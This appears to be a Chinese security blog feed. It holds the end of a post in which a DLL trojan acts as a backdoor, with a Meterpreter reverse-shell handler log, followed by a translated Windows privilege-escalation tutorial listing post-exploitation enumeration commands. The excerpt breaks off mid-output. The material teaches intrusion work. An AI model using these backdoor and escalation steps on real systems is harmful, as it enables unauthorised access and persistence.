<h4 id="8-重启win-7-，我们的DLL-木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner-就会触发木马（想象一下如果把CCleaner-换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们-SYSTEM-shell）"><a href="#8-重启win-7-，我们的DLL-木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner-就会触发木马（想象一下如果把CCleaner-换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们-SYSTEM-shell）" class="headerlink" title="8. 重启win 7 ，我们的DLL 木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner 就会触发木马（想象一下如果把CCleaner 换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们 SYSTEM shell）"></a>8. 重启win 7 ，我们的DLL 木马仍然静静地躺在那里充当着忠实可靠的后门，一旦用户执行CCleaner 就会触发木马（想象一下如果把CCleaner 换成系统服务，还是开机自动启动项，那么一旦用户重启计算机就会触发后门反弹给我们 SYSTEM shell）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; reboot</div><div class="line">Rebooting...</div><div class="line">meterpreter &gt; [*] 192.168.175.145 - Meterpreter session 8 closed.  Reason: Died</div><div class="line"></div><div class="line">meterpreter &gt; </div><div class="line">[*] 192.168.175.145 - Meterpreter session 9 closed.  Reason: Died</div><div class="line"></div><div class="line">msf exploit(windows/local/trusted_service_path) &gt; use exploit/multi/handler </div><div class="line">msf exploit(multi/handler) &gt; run</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.175.143:4444 </div><div class="line">[*] Sending stage (179779 bytes) to 192.168.175.145</div><div class="line">[*] Meterpreter session 10 opened (192.168.175.143:4444 -&gt; 192.168.175.145:49160) at 2018-04-10 11:12:24 -0400</div><div class="line"></div><div class="line">meterpreter &gt; getuid</div><div class="line">Server username: WIN-CKN6B7H8THF\times0ng</div><div class="line">meterpreter &gt;</div></pre></td></tr></table></figure>
<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！"><a href="#希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！" class="headerlink" title="希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！"></a>希望大家能够喜欢，有更好的想法欢迎留言，或者进群交流！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Windows 提权基础（上）]]></title>
      <url>/2018/04/13/Windows-%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
      <content type="html"><![CDATA[<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><h4 id="本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。"><a href="#本篇教程是笔者翻译国外大牛fuzzysecurity-的文章再加上个人的理解写出的关于Windows-提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢-hl0rey-的帮助和建议。" class="headerlink" title="本篇教程是笔者翻译国外大牛fuzzysecurity 的文章再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。"></a>本篇教程是笔者翻译国外<a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="external">大牛fuzzysecurity 的文章</a>再加上个人的理解写出的关于Windows 提权基础的文章，其中有些地方因为不太实用所以做了适当修改，感谢@hl0rey 的帮助和建议。</h4><a id="more"></a>
<h4 id="Indispensable-Resources"><a href="#Indispensable-Resources" class="headerlink" title="Indispensable Resources:"></a>Indispensable Resources:</h4><ul>
<li>Encyclopaedia Of Windows Privilege Escalation (Brett Moore) -<a href="https://www.youtube.com/watch?v=kMG8IsCohHA" target="_blank" rel="external">here</a></li>
<li>Windows Attacks: AT is the new black (Chris Gates &amp; Rob Fuller) -<a href="https://www.youtube.com/watch?v=_8xJaaQlpBo" target="_blank" rel="external">here</a></li>
<li>Elevating privileges by exploiting weak folder permissions (Parvez Anwar) -<a href="http://www.greyhathacker.net/?p=738" target="_blank" rel="external">here</a></li>
</ul>
<h2 id="Δt-for-t0-to-t3-Initial-Information-Gathering"><a href="#Δt-for-t0-to-t3-Initial-Information-Gathering" class="headerlink" title="Δt for t0 to t3 - Initial Information Gathering"></a>Δt for t0 to t3 - Initial Information Gathering</h2><h4 id="这个教程从Windows-的低权限shell-开始讲述如何提权。我们可能利用某个EXP-或者从客户端攻击取得了一个反弹shell-。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。"><a href="#这个教程从Windows-的低权限shell-开始讲述如何提权。我们可能利用某个EXP-或者从客户端攻击取得了一个反弹shell-。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。" class="headerlink" title="这个教程从Windows 的低权限shell 开始讲述如何提权。我们可能利用某个EXP 或者从客户端攻击取得了一个反弹shell 。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。"></a>这个教程从Windows 的低权限shell 开始讲述如何提权。我们可能利用某个EXP 或者从客户端攻击取得了一个反弹shell 。最开始我们还不了解这台计算机，不知道它是干什么用的，连接到哪里，有什么等级的权限或者甚至不知道它是什么操作系统。</h4><h4 id="最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！"><a href="#最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！" class="headerlink" title="最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！"></a>最初我们希望快速的收集一些重要的信息，以便我们能够评估我们所处的状况，并作出正确的判断！</h4><h4 id="首先查看连接的是什么操作系统："><a href="#首先查看连接的是什么操作系统：" class="headerlink" title="首先查看连接的是什么操作系统："></a>首先查看连接的是什么操作系统：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//英文系统</div><div class="line">//C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</div><div class="line">//中文系统</div><div class="line">C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</div><div class="line">OS 名称:                   Microsoft Windows 7 家庭普通版</div><div class="line">OS 版本:                6.1.7601 Service Pack 1 Build 7601</div></pre></td></tr></table></figure>
<h4 id="接下来查看主机名和当前shell-的用户名："><a href="#接下来查看主机名和当前shell-的用户名：" class="headerlink" title="接下来查看主机名和当前shell 的用户名："></a>接下来查看主机名和当前shell 的用户名：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; hostname</div><div class="line">b33f</div><div class="line"></div><div class="line">C:\Windows\system32&gt; echo %username%</div><div class="line">user1</div></pre></td></tr></table></figure>
<h4 id="现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1-不在localgroup-Administrators-中，不是管理员账号。"><a href="#现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1-不在localgroup-Administrators-中，不是管理员账号。" class="headerlink" title="现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1 不在localgroup Administrators 中，不是管理员账号。"></a>现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1 不在localgroup Administrators 中，不是管理员账号。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; net users</div><div class="line"></div><div class="line">User accounts for \\B33F</div><div class="line"></div><div class="line">-------------------------------------------------------------------------------</div><div class="line">Administrator            b33f                     Guest</div><div class="line">user1</div><div class="line">The command completed successfully.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; net user user1</div><div class="line"></div><div class="line">User name                    user1</div><div class="line">Full Name</div><div class="line">Comment</div><div class="line">User&apos;s comment</div><div class="line">Country code                 000 (System Default)</div><div class="line">Account active               Yes</div><div class="line">Account expires              Never</div><div class="line"></div><div class="line">Password last set            1/11/2014 7:47:14 PM</div><div class="line">Password expires             Never</div><div class="line">Password changeable          1/11/2014 7:47:14 PM</div><div class="line">Password required            Yes</div><div class="line">User may change password     Yes</div><div class="line"></div><div class="line">Workstations allowed         All</div><div class="line">Logon script</div><div class="line">User profile</div><div class="line">Home directory</div><div class="line">Last logon                   1/11/2014 8:05:09 PM</div><div class="line"></div><div class="line">Logon hours allowed          All</div><div class="line"></div><div class="line">Local Group Memberships      *Users</div><div class="line">Global Group memberships     *None</div><div class="line">The command completed successfully.</div></pre></td></tr></table></figure>
<h4 id="以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。"><a href="#以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。" class="headerlink" title="以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。"></a>以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。</h4><h4 id="首先我们查看可用的网卡和路由表"><a href="#首先我们查看可用的网卡和路由表" class="headerlink" title="首先我们查看可用的网卡和路由表"></a>首先我们查看可用的网卡和路由表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; ipconfig /all</div><div class="line"></div><div class="line">Windows IP Configuration</div><div class="line"></div><div class="line">   Host Name . . . . . . . . . . . . : b33f</div><div class="line">   Primary Dns Suffix  . . . . . . . :</div><div class="line">   Node Type . . . . . . . . . . . . : Hybrid</div><div class="line">   IP Routing Enabled. . . . . . . . : No</div><div class="line">   WINS Proxy Enabled. . . . . . . . : No</div><div class="line"></div><div class="line">Ethernet adapter Bluetooth Network Connection:</div><div class="line"></div><div class="line">   Media State . . . . . . . . . . . : Media disconnected</div><div class="line">   Connection-specific DNS Suffix  . :</div><div class="line">   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)</div><div class="line">   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29</div><div class="line">   DHCP Enabled. . . . . . . . . . . : Yes</div><div class="line">   Autoconfiguration Enabled . . . . : Yes</div><div class="line">   </div><div class="line">Ethernet adapter Local Area Connection:</div><div class="line"></div><div class="line">   Connection-specific DNS Suffix  . :</div><div class="line">   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection</div><div class="line">   Physical Address. . . . . . . . . : 00-0C-29-56-79-35</div><div class="line">   DHCP Enabled. . . . . . . . . . . : Yes</div><div class="line">   Autoconfiguration Enabled . . . . : Yes</div><div class="line">   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)</div><div class="line">   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)</div><div class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div class="line">   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM</div><div class="line">   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM</div><div class="line">   Default Gateway . . . . . . . . . : 192.168.0.1</div><div class="line">   DHCP Server . . . . . . . . . . . : 192.168.0.1</div><div class="line">   DHCPv6 IAID . . . . . . . . . . . : 234884137</div><div class="line">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35</div><div class="line">   DNS Servers . . . . . . . . . . . : 192.168.0.1</div><div class="line">   NetBIOS over Tcpip. . . . . . . . : Enabled</div><div class="line"></div><div class="line">C:\Windows\system32&gt; route print</div><div class="line"></div><div class="line">===========================================================================</div><div class="line">Interface List</div><div class="line"> 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network)</div><div class="line"> 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9</div><div class="line"> 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection</div><div class="line">  1...........................Software Loopback Interface 1</div><div class="line"> 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter</div><div class="line"> 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2</div><div class="line"> 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3</div><div class="line"> 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface</div><div class="line">===========================================================================</div><div class="line"></div><div class="line">IPv4 Route Table</div><div class="line">===========================================================================</div><div class="line">Active Routes:</div><div class="line">Network Destination        Netmask          Gateway       Interface  Metric</div><div class="line">          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     10</div><div class="line">        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306</div><div class="line">        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">      192.168.0.0    255.255.255.0         On-link     192.168.0.104    266</div><div class="line">    192.168.0.104  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">    192.168.0.255  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306</div><div class="line">        224.0.0.0        240.0.0.0         On-link     192.168.0.104    266</div><div class="line">  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">  255.255.255.255  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">===========================================================================</div><div class="line">Persistent Routes:</div><div class="line">  None</div><div class="line"></div><div class="line">IPv6 Route Table</div><div class="line">===========================================================================</div><div class="line">Active Routes:</div><div class="line"> If Metric Network Destination      Gateway</div><div class="line"> 14     58 ::/0                     On-link</div><div class="line">  1    306 ::1/128                  On-link</div><div class="line"> 14     58 2001::/32                On-link</div><div class="line"> 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128</div><div class="line">                                    On-link</div><div class="line"> 11    266 fe80::/64                On-link</div><div class="line"> 14    306 fe80::/64                On-link</div><div class="line"> 14    306 fe80::8d2:b4e:3f57:ff97/128</div><div class="line">                                    On-link</div><div class="line"> 11    266 fe80::5cd4:9caf:61c0:ba6e/128</div><div class="line">                                    On-link</div><div class="line">  1    306 ff00::/8                 On-link</div><div class="line"> 14    306 ff00::/8                 On-link</div><div class="line"> 11    266 ff00::/8                 On-link</div><div class="line">===========================================================================</div><div class="line">Persistent Routes:</div><div class="line">  None</div><div class="line">  </div><div class="line"># arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; arp -A</div><div class="line"></div><div class="line">Interface: 192.168.0.104 --- 0xb</div><div class="line">  Internet Address      Physical Address      Type</div><div class="line">  192.168.0.1           90-94-e4-c5-b0-46     dynamic</div><div class="line">  192.168.0.101         ac-22-0b-af-bb-43     dynamic</div><div class="line">  192.168.0.255         ff-ff-ff-ff-ff-ff     static</div><div class="line">  224.0.0.22            01-00-5e-00-00-16     static</div><div class="line">  224.0.0.251           01-00-5e-00-00-fb     static</div><div class="line">  224.0.0.252           01-00-5e-00-00-fc     static</div><div class="line">  239.255.255.250       01-00-5e-7f-ff-fa     static</div><div class="line">  255.255.255.255       ff-ff-ff-ff-ff-ff     static</div></pre></td></tr></table></figure>
<h4 id="下面使用netstat-命令查看主机的网络连接和防火墙规则"><a href="#下面使用netstat-命令查看主机的网络连接和防火墙规则" class="headerlink" title="下面使用netstat 命令查看主机的网络连接和防火墙规则"></a>下面使用netstat 命令查看主机的网络连接和防火墙规则</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; netstat -ano</div><div class="line"></div><div class="line">Active Connections</div><div class="line"></div><div class="line">  Proto  Local Address          Foreign Address        State           PID</div><div class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       684</div><div class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    127.0.0.1:5354         0.0.0.0:0              LISTENING       1400</div><div class="line">  TCP    192.168.0.104:139      0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    [::]:135               [::]:0                 LISTENING       684</div><div class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</div><div class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</div><div class="line">  UDP    0.0.0.0:5355           *:*                                    1100</div><div class="line">  UDP    0.0.0.0:52282          *:*                                    976</div><div class="line">  UDP    0.0.0.0:55202          *:*                                    2956</div><div class="line">  UDP    0.0.0.0:59797          *:*                                    1400</div><div class="line">  UDP    127.0.0.1:1900         *:*                                    2956</div><div class="line">  UDP    127.0.0.1:65435        *:*                                    2956</div><div class="line">  UDP    192.168.0.104:137      *:*                                    4</div><div class="line">  UDP    192.168.0.104:138      *:*                                    4</div><div class="line">  UDP    192.168.0.104:1900     *:*                                    2956</div><div class="line">  UDP    192.168.0.104:5353     *:*                                    1400</div><div class="line">  UDP    192.168.0.104:65434    *:*                                    2956</div><div class="line">  UDP    [::]:5355              *:*                                    1100</div><div class="line">  UDP    [::]:52281             *:*                                    976</div><div class="line">  UDP    [::]:52283             *:*                                    976</div><div class="line">  UDP    [::]:55203             *:*                                    2956</div><div class="line">  UDP    [::]:59798             *:*                                    1400</div><div class="line">  UDP    [::1]:1900             *:*                                    2956</div><div class="line">  UDP    [::1]:5353             *:*                                    1400</div><div class="line">  UDP    [::1]:65433            *:*                                    2956</div><div class="line">  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:1900  *:*                      2956</div><div class="line">  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:65432  *:*                     2956</div><div class="line">  </div><div class="line"># The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh</div><div class="line">firewall commands are only available from XP SP2 and upwards.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; netsh firewall show state</div><div class="line"></div><div class="line">Firewall status:</div><div class="line">-------------------------------------------------------------------</div><div class="line">Profile                           = Standard</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line">Group policy version              = Windows Firewall</div><div class="line">Remote admin mode                 = Disable</div><div class="line"></div><div class="line">Ports currently open on all network interfaces:</div><div class="line">Port   Protocol  Version  Program</div><div class="line">-------------------------------------------------------------------</div><div class="line">No ports are currently open on all network interfaces.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; netsh firewall show config</div><div class="line"></div><div class="line">Domain profile configuration:</div><div class="line">-------------------------------------------------------------------</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line"></div><div class="line">Allowed programs configuration for Domain profile:</div><div class="line">Mode     Traffic direction    Name / Program</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">Port configuration for Domain profile:</div><div class="line">Port   Protocol  Mode    Traffic direction     Name</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">ICMP configuration for Domain profile:</div><div class="line">Mode     Type  Description</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   2     Allow outbound packet too big</div><div class="line"></div><div class="line">Standard profile configuration (current):</div><div class="line">-------------------------------------------------------------------</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line"></div><div class="line">Service configuration for Standard profile:</div><div class="line">Mode     Customized  Name</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   No          Network Discovery</div><div class="line"></div><div class="line">Allowed programs configuration for Standard profile:</div><div class="line">Mode     Traffic direction    Name / Program</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   Inbound              COMRaider / E:\comraider\comraider.exe</div><div class="line">Enable   Inbound              nc.exe / C:\users\b33f\desktop\nc.exe</div><div class="line"></div><div class="line">Port configuration for Standard profile:</div><div class="line">Port   Protocol  Mode    Traffic direction     Name</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">ICMP configuration for Standard profile:</div><div class="line">Mode     Type  Description</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   2     Allow outbound packet too big</div><div class="line"></div><div class="line">Log configuration:</div><div class="line">-------------------------------------------------------------------</div><div class="line">File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log</div><div class="line">Max file size   = 4096 KB</div><div class="line">Dropped packets = Disable</div><div class="line">Connections     = Disable</div></pre></td></tr></table></figure>
<h4 id="最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动"><a href="#最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动" class="headerlink" title="最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动"></a>最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div></pre></td><td class="code"><pre><div class="line"># This will display verbose output for all scheduled tasks, below you can see sample output for a</div><div class="line">single task.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; schtasks /query /fo LIST /v</div><div class="line"></div><div class="line">Folder: \Microsoft\Windows Defender</div><div class="line">HostName:                             B33F</div><div class="line">TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan</div><div class="line">Next Run Time:                        1/22/2014 5:11:13 AM</div><div class="line">Status:                               Ready</div><div class="line">Logon Mode:                           Interactive/Background</div><div class="line">Last Run Time:                        N/A</div><div class="line">Last Result:                          1</div><div class="line">Author:                               N/A</div><div class="line">Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob</div><div class="line">                                      -WinTask -RestrictPrivilegesScan</div><div class="line">Start In:                             N/A</div><div class="line">Comment:                              Scheduled Scan</div><div class="line">Scheduled Task State:                 Enabled</div><div 